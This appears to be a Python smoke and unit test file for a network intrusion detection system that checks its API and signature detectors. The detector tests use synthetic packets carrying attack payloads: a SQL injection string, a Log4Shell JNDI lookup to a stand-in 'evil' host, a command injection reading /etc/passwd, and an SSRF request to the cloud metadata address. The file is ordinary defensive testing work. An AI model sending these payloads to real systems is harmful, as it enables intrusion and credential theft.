"""Smoke tests: run with /tmp/nadvenv/bin/python tests/test_smoke.py"""
import urllib.request, urllib.parse, json

BASE = "http://127.0.0.1:8000"


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=10) as r:
        return json.load(r)


def test_health():
    assert get("/api/health")["status"] == "ok"


def test_stats_shape():
    s = get("/api/stats")
    for k in ("packets", "pps", "active_flows", "alerts", "total_alerts"):
        assert k in s, f"missing {k}"
    assert s["packets"] > 0, "no packets captured — is the simulator running?"


def test_alerts_have_intel():
    d = get("/api/alerts?limit=20")
    assert len(d["alerts"]) > 0, "no alerts yet — wait a few seconds and retry"
    a = d["alerts"][0]
    for k in ("attack_type", "severity", "mitre", "remediation", "threat_score"):
        assert k in a, f"alert missing {k}"


def test_catalog_coverage():
    d = get("/api/catalog")
    names = {x["attack"] for x in d["detectors"]}
    for expected in ("Port Scan", "SYN Flood", "DDoS", "SSH Brute Force",
                     "DNS Tunneling", "Malware C2", "SQL Injection", "ARP Spoofing"):
        assert expected in names, f"missing detector {expected}"


def test_analytics():
    t = get("/api/analytics/traffic")
    assert "protocols" in t and "attack_mix" in t
    tt = get("/api/analytics/top-talkers")
    assert len(tt["talkers"]) > 0


def test_signature_unit():
    from backend.detection.signature_engine import SignatureEngine
    from backend.detection.correlation import correlate
    sig = SignatureEngine(port_scan_ports=3, syn_flood_count=3, brute_force_fails=2)
    hits = []
    for p in range(4):  # port scan
        hits += sig.check_packet({"src_ip": "9.9.9.9", "dst_ip": "1.1.1.1",
                                  "src_port": 1000 + p, "dst_port": 2000 + p,
                                  "protocol": "TCP", "length": 60, "flags": "S",
                                  "payload_len": 0, "dns_query": "", "http_payload": ""})
    assert any(h["attack_type"] == "Port Scan" for h in hits)
    sqli = sig.check_packet({"src_ip": "a", "dst_ip": "b", "src_port": 1, "dst_port": 80,
                             "protocol": "TCP", "length": 9, "flags": "PA", "payload_len": 9,
                             "dns_query": "", "http_payload": "x' UNION SELECT 1--"})
    assert any(h["attack_type"] == "SQL Injection" for h in sqli)
    final = correlate(hits[:1], None)
    assert final["threat_score"] >= 60 and final["mitre"] == "T1046"


def _pkt(**kw):
    d = {"src_ip": "9.9.9.9", "dst_ip": "1.1.1.1", "src_port": 1111,
         "dst_port": 80, "protocol": "TCP", "length": 100, "flags": "PA",
         "payload_len": 50, "payload_text": "", "dns_query": "", "http_payload": ""}
    d.update(kw)
    return d


def test_new_detectors_v3():
    """Unit coverage for the 12 detectors added in engine v3."""
    from backend.detection.signature_engine import SignatureEngine, CATALOG
    assert len(CATALOG) == 30, f"catalog has {len(CATALOG)} entries, expected 30"
    sig = SignatureEngine(port_scan_ports=999, syn_flood_count=999,
                          brute_force_fails=2, sweep_dsts=3, horiz_dsts=3,
                          spray_dsts=3, smb_count=3, slowloris_count=3,
                          amp_count=3)
    got = set()

    def feed(p):
        for a in sig.check_packet(p):
            got.add(a["attack_type"])

    for i in range(4):  # ping sweep: distinct ICMP dsts
        feed(_pkt(protocol="ICMP", src_port=0, dst_port=0, dst_ip=f"10.0.0.{i}"))
    for i in range(4):  # horizontal scan: one port, many hosts
        feed(_pkt(dst_ip=f"10.0.1.{i}", dst_port=6379, flags="S", payload_len=0))
    for i in range(3):  # password spraying: fails across hosts
        feed(_pkt(dst_ip=f"10.0.2.{i}", dst_port=22,
                  http_payload="SSH Failed password"))
    for _ in range(4):  # SMB lateral movement
        feed(_pkt(dst_port=445, flags="S", payload_len=0))
    for _ in range(4):  # slowloris
        feed(_pkt(dst_port=80, payload_len=90,
                  http_payload="POST /form Content-Length: 9999"))
    for _ in range(4):  # NTP amplification
        feed(_pkt(protocol="UDP", dst_port=123, payload_len=48))
    feed(_pkt(dst_port=3389, http_payload="RDP login failed 401"))  # RDP (needs 2nd fail)
    feed(_pkt(dst_port=3389, http_payload="RDP login failed 401"))
    feed(_pkt(dst_port=23, http_payload="login failed"))  # Telnet (needs 2nd)
    feed(_pkt(dst_port=23, http_payload="login failed"))
    feed(_pkt(http_payload="GET /?x=${jndi:ldap://evil/a}"))          # Log4Shell
    feed(_pkt(http_payload="GET /ping?ip=1;cat /etc/passwd"))         # CMDi
    feed(_pkt(http_payload="GET /f?url=http://169.254.169.254/x"))    # SSRF
    feed(_pkt(dst_port=3333, http_payload='{"method":"mining.subscribe"}'))  # miner

    for expected in ("Ping Sweep", "Horizontal Scan", "Password Spraying",
                     "SMB Lateral Movement", "Slowloris", "UDP Amplification",
                     "RDP Brute Force", "Telnet Brute Force", "Log4Shell",
                     "Command Injection", "SSRF Attempt", "Cryptominer"):
        assert expected in got, f"{expected} did not fire (got {sorted(got)})"
